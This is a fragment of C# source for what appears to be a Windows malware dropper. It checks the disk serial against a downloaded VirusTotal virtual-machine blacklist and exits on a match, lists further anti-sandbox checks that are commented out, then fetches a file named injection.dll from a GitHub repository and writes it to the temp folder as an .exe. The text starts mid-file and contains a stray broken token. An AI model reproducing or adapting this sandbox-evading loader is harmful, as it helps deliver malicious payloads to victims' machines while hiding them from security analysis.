                diskSerial = disk["SerialNumber"].ToString();
            }

            string serialDisk = new WebClient().DownloadString("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt");

            if (serialDisk.Contains(diskSerial))
            {
                Environment.Exit(0);
            }
        }

        // Your Program CODE IS HERE 

        /// <summary>
        /// 해당 애플리케이션의 주 진입점입니다.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //            CheckVirtualEnvironment();
            //            RegistryCheck();
            //ProcessesAndFilesCheck();
            //MacCheck();
            //CheckPC();
            //HWID_VM();
            //CheckGPU();
            //CheckIP();
            //CheckProfiles();
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();

            System.Text.Decoder utf8Decode = encoder.GetDecoder();
            string dll = new WebClient().DownloadString("https://raw.githubusercontent.com/eid129382/dll_injection/main/injection.dll");
            string temp = Path.GetTempPath();
            try
            {
                Random rand = new Random(40382);
                File.WriteAllText("" + temp + rand + ".exe", dll);
                i
            }
            catch
            {

            }
        }
    }
}


